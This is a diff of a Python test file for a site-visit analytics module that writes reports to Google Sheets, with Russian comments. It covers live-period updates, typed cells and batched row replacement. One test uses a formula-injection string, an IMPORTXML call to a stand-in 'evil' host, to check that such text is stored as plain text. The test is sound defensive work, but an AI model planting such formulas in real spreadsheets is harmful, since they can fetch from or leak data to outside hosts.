@@ -13,7 +13,7 @@ Google здесь не участвует: отправка подменяетс
 from __future__ import annotations
 
 import ast
-from datetime import UTC, datetime, timedelta
+from datetime import UTC, date, datetime, timedelta
 from pathlib import Path
 
 import pytest
@@ -25,7 +25,7 @@ from app.api.router import api_router
 from app.visits import collect, report
 from app.visits.db import visits_session
 from app.visits.models import SitePageView, SiteReport, SiteVisit, SiteVisitor
-from app.visits.sheets import safe_cell
+from app.visits.sheets import MAX_CELLS_PER_REQUEST, cell, plan_replace
 
 BACKEND = Path(__file__).resolve().parents[1]
 DAY = datetime(2026, 11, 23, 19, 0, tzinfo=UTC)  # 24.11.2026 00:00 по Алматы
@@ -242,15 +242,79 @@ def test_staroe_uchityvaetsya_i_udalyaetsya() -> None:
         assert db.get(SiteVisitor, "visitor_old_1") is not None
 
 
+# ── Живой период ─────────────────────────────────────────────────────────────
+
+
+def test_zhivoy_period_pishetsya_tolko_pri_izmenenii() -> None:
+    sent: list[report.Report] = []
+    report._last_live.clear()
+    now = DAY + timedelta(days=1, hours=2)
+    _seen("visitor_liv_1", "visit_liv_001", "page_liv_0001", at=DAY + timedelta(hours=9))
+
+    assert report.refresh_live(sent.append, now=now) is True
+    live = sent[-1]
+    assert live.final is False
+    row = dict(zip(report.TABS[report.TAB_SUMMARY], live.rows[report.TAB_SUMMARY][0]))
+    assert row["Статус"] == report.STATUS_LIVE
+    assert len(live.rows[report.TAB_DAYS]) == 2, "будущие дни идущего периода не пишутся"
+
+    # Ничего не изменилось — Google не трогается.
+    assert report.refresh_live(sent.append, now=now + timedelta(seconds=30)) is False
+    # Пришло активное время — пишется снова.
+    _left("visitor_liv_1", "visit_liv_001", "page_liv_0001", 40, at=now)
+    assert report.refresh_live(sent.append, now=now + timedelta(seconds=60)) is True
+    assert len(sent) == 2
+
+    # Период закрылся: итог, и живого больше нет до первого визита следующего.
+    assert report.run_due(sent.append, now=DAY + timedelta(days=3, minutes=1)) == 1
+    final = dict(zip(report.TABS[report.TAB_SUMMARY], sent[-1].rows[report.TAB_SUMMARY][0]))
+    assert final["Статус"] == report.STATUS_FINAL
+    assert report.current_period(DAY + timedelta(days=3, minutes=2)) == (DAY + timedelta(days=3), DAY + timedelta(days=6))
+
+
 # ── Таблица ──────────────────────────────────────────────────────────────────
 
 
-def test_tekst_ne_stanovitsya_formuloy() -> None:
-    assert safe_cell('=IMPORTXML("https://evil", "//a")') == "'=IMPORTXML(\"https://evil\", \"//a\")"
-    assert safe_cell("14.2") == "'14.2"  # версия iOS, а не 14 февраля
-    assert safe_cell("24.11.2026 14:05") == "24.11.2026 14:05"
-    assert safe_cell("24.11.2026") == "24.11.2026"
-    assert safe_cell(42) == 42 and safe_cell(None) == "" and safe_cell("") == ""
+def test_yacheyki_s_yavnym_tipom() -> None:
+    formula = '=IMPORTXML("https://evil", "//a")'
+    assert cell(formula) == {"userEnteredValue": {"stringValue": formula}}, "формула ушла бы формулой"
+    assert cell("14.2") == {"userEnteredValue": {"stringValue": "14.2"}}  # версия iOS, не 14 февраля
+    assert cell(42) == {"userEnteredValue": {"numberValue": 42}}
+    assert cell(None) == {} and cell("") == {}
+    stamp = cell(datetime(2026, 11, 24, 15, 23))
+    assert stamp["userEnteredFormat"]["numberFormat"]["type"] == "DATE_TIME"
+    assert abs(stamp["userEnteredValue"]["numberValue"] - 46350.640972) < 1e-5
+    assert cell(date(2026, 11, 24))["userEnteredValue"]["numberValue"] == 46350
+
+
+def test_zamena_perioda_bez_dubley() -> None:
+    """Строки периода удаляются снизу вверх и пишутся заново; чужие периоды целы."""
+    label = "24.11.2026 – 26.11.2026"
+    fake = report.Report(start=DAY, end=DAY + timedelta(days=3), label=label)
+    fake.rows = {tab: [[label] + [""] * (len(h) - 1)] for tab, h in report.TABS.items()}
+    ids = {tab: n for n, tab in enumerate(report.TABS)}
+    column_a = {tab: ["Период"] for tab in report.TABS}
+    column_a[report.TAB_VISITS] = ["Период", "21.11.2026 – 23.11.2026", label, label, "x", label]
+
+    batches = plan_replace(fake, ids, column_a)
+    deletes = [r["deleteDimension"]["range"] for r in batches[0] if "deleteDimension" in r]
+    assert [(d["startIndex"], d["endIndex"]) for d in deletes] == [(5, 6), (2, 4)]
+    appends = [r for batch in batches for r in batch if "appendCells" in r]
+    assert len(appends) == len(report.TABS)
+
+
+def test_bolshoy_period_rezhetsya_na_pachki() -> None:
+    label = "24.11.2026 – 26.11.2026"
+    width = len(report.TABS[report.TAB_VISITS])
+    fake = report.Report(start=DAY, end=DAY + timedelta(days=3), label=label)
+    fake.rows = {report.TAB_VISITS: [[label] * width for _ in range(5000)]}
+    batches = plan_replace(fake, {t: 1 for t in report.TABS}, {t: [] for t in report.TABS})
+    cells = [
+        sum(len(r["appendCells"]["rows"]) * width for r in batch if "appendCells" in r)
+        for batch in batches
+    ]
+    assert len(batches) > 1 and max(cells) <= MAX_CELLS_PER_REQUEST
+    assert sum(cells) == 5000 * width
 
 
 def test_modul_ne_znaet_pro_finansy() -> None:
